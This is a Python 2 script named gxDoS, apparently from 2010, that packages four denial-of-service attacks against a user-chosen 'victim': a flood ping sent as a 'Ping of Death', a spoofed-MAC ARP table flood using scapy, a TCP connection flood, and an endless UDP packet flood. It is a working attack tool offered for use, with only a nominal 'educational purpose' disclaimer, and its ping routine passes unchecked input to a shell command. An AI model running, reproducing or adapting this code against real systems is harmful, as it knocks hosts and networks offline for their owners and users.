#!/usr/bin/python
#############################################################################
# gxDoS v.0.0.1                                        (c) copyleft 12/2010 #
# Author: aBi71                                      	                    #
# Site: http://abi71.wordpress.com                  	                    #
# Email: l0g [dot] bima [at] gmail.com               	                    #
# Credits: [G]unadarma [X]malang [R]esearch [G]roups 	                    #
# license: Licensed under the GNU General Public License                    #
#############################################################################
#Greatz to gxrg linux team
#ray16, mad, vodka, cgilla, virus, isal90, choober, Azure, Bara, stupid, acha
#zake, d_kun, bagoel, etc
# 
#DESC: 
#This is a python script for DoS(Denial of Service) Attack.
#
#NOTES:
#This was written for educational purpose only. Use it at your own risk.
#Author will be not responsible for any damage!
#
#UNIX TOOLS: 
#ping, scapy(2.1.0)

import os, sys, time, random, logging, socket
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
	from scapy.all import *
except ImportError:
	print '[!] Please install scapy first.'
	
##################################
#  METHOD : art                  #
#  PURPOSE: Show Art             #
##################################

def art():
	print "                ________          _________"
	print "   ____ ___  ___\______ \   ____ /   _____/"
	print "  / ___\\\  \/  / |    |  \ /  _ \\_____   \\"
	print " / /_/  >>    <  |    `   (  <_> )        \\"
	print " \___  //__/\_ \/_______  /\____/_______  /"
	print "/_____/       \/        \/      v.0.0.1 \/\n"


##################################
#  METHOD  : help                #
#  PURPOSE : Show usage          #
##################################

def help():
	print '\nUsage :' + sys.argv[0] + ' <options>'
	print 'Options:'
  	print '    -h, --help\t  display this help'
	print '    -a, --arp\t  arp flood'
   	print '    -p, --pod\t  ping of death'
	print '    -t, --tcp\t  tcp flood'
	print '    -u, --udp\t  udp flood\n'
	print 'Ex: ./gxDoS.py -p'
	print '    ./gxDoS.py --arp\n'		
	print 'Please visit <http://projects.gxrg.org, http://abi71.wordpress.com>'
	print 'Send mail to <l0g.bima@gmail.com>'
	
##############################################
# METHOD : MACrandom	                     #
# PURPOSE: generate random mac address       #
##############################################

def MACrandom():
	mac = [ random.randint(0x00, 0xff),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff) ]
	return ':'.join(map(lambda x: "%02x" % x, mac))
	

#####################################################################
#  METHOD : PoD (Ping of Death)                 		    #  
#  PURPOSE: Sends packet of 65507+8(header icmp) bytes repeatedly,  #
#           if the host isn't ready it will be crash.               #
#####################################################################

def PoD():
	host = raw_input("# Ping of Death\n\nVictim -> ")
	try:
		state = os.system("ping -w 1 " + host + " > /dev/null")
		if not state:
			os.system("ping -fs 65507 -i 0.01 " + host)
		else:
			print host + ": is down" 
	except:
			sys.exit(1)
			
#####################################################################################
#  METHOD : ARP Flood                                                 		    #  
#  PURPOSE: Send fake ARP packets repeatedly to flood the ARP table victims         #
#####################################################################################

def ARP_Flood():
	host = raw_input("# ARP Flood\n\nVictim -> ")
	mac_host = raw_input("MAC Address Victim -> ")
	try:
		conf.verb=0
		while True:
			mac_flood=MACrandom() #call method MACrandom
			print "Sending ARP [" + mac_flood + "] to " + host + " [" + mac_host + "]"
			sendp(Ether(dst=mac_host)/ARP(hwsrc=mac_flood, psrc=host+"/24", pdst=host))
			time.sleep(1)	
	except IndexError: 
		sys.exit()
			
###########################################################
#  METHOD : TCP Flood                                     #
#  PURPOSE: Connect to target and reset the connections   #
###########################################################

def TCP_Flood():
	host = raw_input("# TCP Flood \n\nHost -> ")
	port = int(raw_input("Port -> "))
	status=0
	total=0
	bytes=0
	second=0
	timeout=0.000001
	print '\nTarget DoS: ('+ host + ') on port ' + str(port) + '\n'
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((host, port))
		sock.settimeout(timeout)
		status=1
	except socket.error:
		status=0
	if status == 0:
		print "Closed/Filtered port, or connection problem."
		sys.exit()
	sock.close()
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			total += 1
			bytes += 74+54
			kbytes=str(bytes/1024)
			second += 2
			sock.connect((host, port))
			sock.settimeout(timeout)
			sock.sendto(kbytes,(host,port))
			sys.stdout.write("\rTotal packets sent: %i" % total)
		except socket.error:
			try_again="yes"

###########################################################
#  METHOD : UDP Flood                                     #
#  PURPOSE: Floods bytes packet                           #
###########################################################

def UDP_Flood():
	host = raw_input("# UDP Flood\n\nHost -> ")
	port = int(raw_input("Port -> "))
	total = 0
	bytes = random._urandom(1024)
	print '\nTarget DoS: ('+ host + ') on port ' + str(port) + '\n'
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.connect((host, port))
		while True:
			total += 1
			send_bytes = sock.sendto(bytes,(host,port))	
			sys.stdout.write("\rTotal packets sent: %i" % total)
		sock.close()
	except socket.error:
		print "Closed/Filtered port, or connection problem"

if __name__ == '__main__':
	if len(sys.argv) == 2:
		try:
			if sys.argv[1] == "-a" or sys.argv[1] == "--arp":
				art()
				ARP_Flood()
			elif sys.argv[1] == "-t" or sys.argv[1] == "--tcp":
				art()
				TCP_Flood()
			elif sys.argv[1] == "-u" or sys.argv[1] == "--udp":
				art()
				UDP_Flood()
			elif sys.argv[1] == "-p" or sys.argv[1] == "--pod":
				art()
				PoD()
			elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
				art()
				help()
			else:
				art()
				print 'Try `' + sys.argv[0] + ' --help\' for more information.'
		except KeyboardInterrupt:
			print ''
			sys.exit(0)
	else:
		art()
		print 'Try `' + sys.argv[0] + ' --help\' for more information.'